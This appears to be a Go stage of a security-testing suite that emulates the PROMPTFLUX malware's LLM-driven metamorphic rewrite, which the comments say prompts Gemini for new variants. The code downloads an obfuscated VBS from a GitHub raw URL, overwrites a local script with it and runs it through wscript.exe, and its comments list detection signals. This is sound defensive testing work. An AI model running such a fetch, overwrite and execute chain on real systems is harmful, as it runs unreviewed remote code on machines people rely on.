//go:build windows
// +build windows

/*
STAGE 2: Obfuscated Files or Information (T1027.001)

Simulates the PROMPTFLUX "Thinging" module's hourly metamorphic rewrite. A real
PROMPTFLUX prompts Gemini for a new variant body every ~hour and overwrites its
on-disk VBS in place — producing a different string/byte hash for the same
behaviour. We model that by fetching a SECOND obfuscated benign VBS
(variant_thinging.vbs) from raw.githubusercontent.com and overwriting the
stage-1 file at c:\F0\crypted_ScreenRec_webinstall.vbs in place, then
invoking wscript.exe on the new variant.

Detection opportunities:
  - Two sequential HTTPS GETs to raw.githubusercontent.com from the same
    binary within ~10 seconds — polymorphic-LLM-fetch behavioural signal
  - Write-over-same-filename of a VBS in c:\F0 (content hash changes)
  - Both stage-1 and stage-2 markers created within one test window
*/

package main

import (
	"crypto/tls"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

const (
	TEST_UUID      = "0a749b39-409e-46f5-9338-ee886b439cfa"
	TECHNIQUE_ID   = "T1027.001"
	TECHNIQUE_NAME = "Metamorphic Rewrite — Thinging Module"
	STAGE_ID       = 2

	STAGE2_VARIANT_URL = "https://raw.githubusercontent.com/projectachilles/ProjectAchilles/main/lab-assets/promptflux/v1/variant_thinging.vbs"

	VBS_TARGET_PATH = `c:\F0\crypted_ScreenRec_webinstall.vbs`
	STAGE2_NET_LOG  = `c:\F0\stage2_network.log`
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting PROMPTFLUX stage-2 (Thinging hourly rewrite simulation)")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Fetch variant_thinging.vbs; overwrite stage-1 VBS; invoke wscript")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))

		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] Metamorphic overwrite + wscript complete\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, "Stage-2 variant fetched, overwrote stage-1, executed")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success",
		"variant_thinging.vbs fetched; stage-1 VBS overwritten with new content hash; wscript invoked; marker file created")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	// Pre-state: snapshot stage-1 VBS hash (for the "content hash changed" IOC).
	origHash := ""
	if orig, err := os.ReadFile(VBS_TARGET_PATH); err == nil {
		sum := sha256.Sum256(orig)
		origHash = hex.EncodeToString(sum[:])
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Stage-1 VBS SHA256 (pre-rewrite): %s", origHash))
	}

	if err := os.MkdirAll(filepath.Dir(VBS_TARGET_PATH), 0755); err != nil {
		return fmt.Errorf("dir create: %v", err)
	}

	netLog, _ := os.OpenFile(STAGE2_NET_LOG, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if netLog != nil {
		defer netLog.Close()
		fmt.Fprintf(netLog, "[%s] stage2 start; target_url=%s\n",
			time.Now().UTC().Format(time.RFC3339), STAGE2_VARIANT_URL)
	}

	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12},
		},
	}

	req, err := http.NewRequest("GET", STAGE2_VARIANT_URL, nil)
	if err != nil {
		return fmt.Errorf("http request build: %v", err)
	}
	req.Header.Set("User-Agent", "PromptfluxClient/1.0 (simulated thinging)")
	req.Header.Set("Accept", "text/plain")

	startTime := time.Now()
	resp, err := client.Do(req)
	fetchDuration := time.Since(startTime)

	if err != nil {
		if netLog != nil {
			fmt.Fprintf(netLog, "[%s] GET failed after %v: %v\n",
				time.Now().UTC().Format(time.RFC3339), fetchDuration, err)
		}
		return fmt.Errorf("https get to github raw unavailable: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("github raw returned non-200 status: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("response body read: %v", err)
	}
	if len(body) < 40 {
		return fmt.Errorf("variant VBS too short (%d bytes) - lab asset malformed?", len(body))
	}

	newHash := hex.EncodeToString(func() []byte { s := sha256.Sum256(body); return s[:] }())
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Stage-2 variant SHA256 (new): %s", newHash))
	if origHash != "" && origHash == newHash {
		return fmt.Errorf("variant identical to stage-1 VBS - lab-asset rotation failure")
	}

	if netLog != nil {
		fmt.Fprintf(netLog, "[%s] variant fetched: %d bytes, sha256=%s\n",
			time.Now().UTC().Format(time.RFC3339), len(body), newHash)
	}

	// Overwrite stage-1 VBS in place — the Thinging signal.
	if err := os.WriteFile(VBS_TARGET_PATH, body, 0644); err != nil {
		return fmt.Errorf("vbs overwrite: %v", err)
	}
	LogFileDropped("crypted_ScreenRec_webinstall.vbs (rewritten)", VBS_TARGET_PATH, int64(len(body)), false)

	time.Sleep(1500 * time.Millisecond)
	if _, err := os.Stat(VBS_TARGET_PATH); os.IsNotExist(err) {
		return fmt.Errorf("vbs file quarantined after overwrite")
	}

	// Invoke wscript.exe on the new variant.
	wscriptOut := `c:\F0\stage2_wscript_output.txt`
	cmd := exec.Command("wscript.exe", "//Nologo", VBS_TARGET_PATH)
	if outFile, err := os.Create(wscriptOut); err == nil {
		defer outFile.Close()
		cmd.Stdout = outFile
		cmd.Stderr = outFile
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Invoking wscript.exe on rewritten %s", VBS_TARGET_PATH))
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("wscript.exe run: %v", err)
	}

	// Confirm the stage-2 marker is present (distinct from stage-1).
	markerPath := `c:\F0\promptflux_stage2_marker.txt`
	time.Sleep(500 * time.Millisecond)
	if _, err := os.Stat(markerPath); os.IsNotExist(err) {
		return fmt.Errorf("stage-2 VBS marker not produced: %s", markerPath)
	}

	LogFileDropped("promptflux_stage2_marker.txt", markerPath, 0, false)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Metamorphic rewrite confirmed: %s → %s", origHash, newHash))

	return nil
}

// ==============================================================================
// EXIT CODE — blame-free (Rule 1)
// ==============================================================================

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available", "unavailable", "unreachable", "no such host"}) {
		return StageError
	}
	return StageError
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
